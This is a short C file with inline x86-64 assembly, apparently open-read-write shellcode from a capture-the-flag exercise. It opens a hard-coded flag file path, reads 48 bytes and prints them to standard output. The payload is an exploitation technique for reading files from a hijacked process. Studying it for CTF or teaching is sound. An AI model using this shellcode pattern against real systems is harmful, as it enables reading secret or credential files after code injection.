// File name: orw.c
// Compile Option: gcc -o orw orw.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"
    "xor rax, rax\n"
    "push rax\n"
    "mov rax, 0x676e6f6f6f6f6f6f\n"
    "push rax\n"
    "mov rax, 0x6c5f73695f656d61\n"
    "push rax\n"
    "mov rax, 0x6e5f67616c662f63\n"
    "push rax\n"
    "mov rax, 0x697361625f6c6c65\n"
    "push rax\n"
    "mov rax, 0x68732f656d6f682f\n"
    "push rax\n"
    
    "mov rdi, rsp\n"
    "xor rsi, rsi\n"
    "xor rdx, rdx\n"
    "mov rax, 0x02\n"
    "syscall\n"

    "mov rdi, rax\n"
    "mov rsi, rsp\n"
    "sub rsi, 0x30\n"
    "mov rdx, 0x30\n"
    "xor rax, rax\n"
    "syscall\n"
    
    "mov rdi, 0x1\n"
    "mov rax, 0x1\n"
    "syscall\n"

    "xor rdi, rdi   # rdi = 0\n"
    "mov rax, 0x3c	# rax = sys_exit\n"
    "syscall        # exit(0)");

void run_sh();

int main() { run_sh(); }
